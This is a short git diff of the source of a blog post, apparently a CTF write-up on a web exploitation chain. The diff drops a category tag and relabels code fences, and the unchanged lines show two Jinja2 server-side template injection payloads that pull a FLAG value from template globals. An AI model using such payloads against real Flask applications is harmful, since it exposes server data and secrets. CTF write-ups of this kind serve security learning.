@@ -3,7 +3,7 @@ title: "Technovate CTF: The Memories Writeup"
 description: "A multi-step web exploitation chain combining credential leakage, IDOR, SSTI, and Flask session forgery."
 date: 2026-07-06 22:25:00
 categories:
-  - [Writeups, 周刊]
+  - [Writeups]
 tags:
   - Web Exploitation
   - IDOR
@@ -86,11 +86,11 @@ Now running in **unsandboxed Jinja environment**.
 
 ### Payloads
 
-```jinja2
+```html
 {{ self.__init__.__globals__['FLAG'] }}
 ```
 
-```jinja2
+```html
 {{ self.__dict__._TemplateReference__context.get('FLAG') }}
 ```
 
